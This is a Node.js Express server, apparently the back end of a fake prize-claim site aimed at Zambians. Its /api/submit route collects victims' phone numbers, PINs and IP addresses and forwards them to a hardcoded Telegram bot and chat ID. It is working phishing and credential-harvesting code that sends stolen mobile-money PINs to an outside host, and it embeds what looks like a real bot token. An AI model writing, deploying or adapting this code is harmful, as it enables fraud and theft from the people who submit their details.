const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8940830095:AAGN0atvM_dR8qdLKJYdsg3U-xhsLe6qcZA';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '8981684985';
const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '..'), { extensions: ['html'] }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

function esc(s = '') {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

app.get('/', (_req, res) => {
  res.json({
    ok: true,
    service: 'zambia-claim-backend',
    telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
    time: new Date().toISOString()
  });
});

app.get('/health', (_req, res) => res.json({ ok: true, ts: Date.now() }));

app.post('/api/submit', async (req, res) => {
  try {
    const { number, pin, prize } = req.body || {};

    if (!number || !pin) {
      return res.status(400).json({ ok: false, error: 'Missing number or pin' });
    }

    const text =
      `🎉 <b>Zambia Claim Submission</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${esc(number)}</code>\n` +
      `🔑 <b>PIN:</b> <code>${esc(pin)}</code>\n` +
      `💰 <b>Prize:</b> ZMW ${esc(prize || '—')}\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB',{ timeZone: 'Africa/Lusaka' })} CAT\n` +
      `🌐 <b>IP:</b> <code>${esc(req.ip || 'unknown')}</code>`;

    const r = await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    const data = await r.json();

    if (!data.ok) {
      console.error('Telegram rejected:', data);
      return res.status(502).json({ ok: false, error: data.description });
    }

    return res.json({ ok: true });
  } catch (err) {
    console.error('submit error:', err);
    return res.status(500).json({ ok: false, error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`Zambia claim backend running on port ${PORT}`);
});
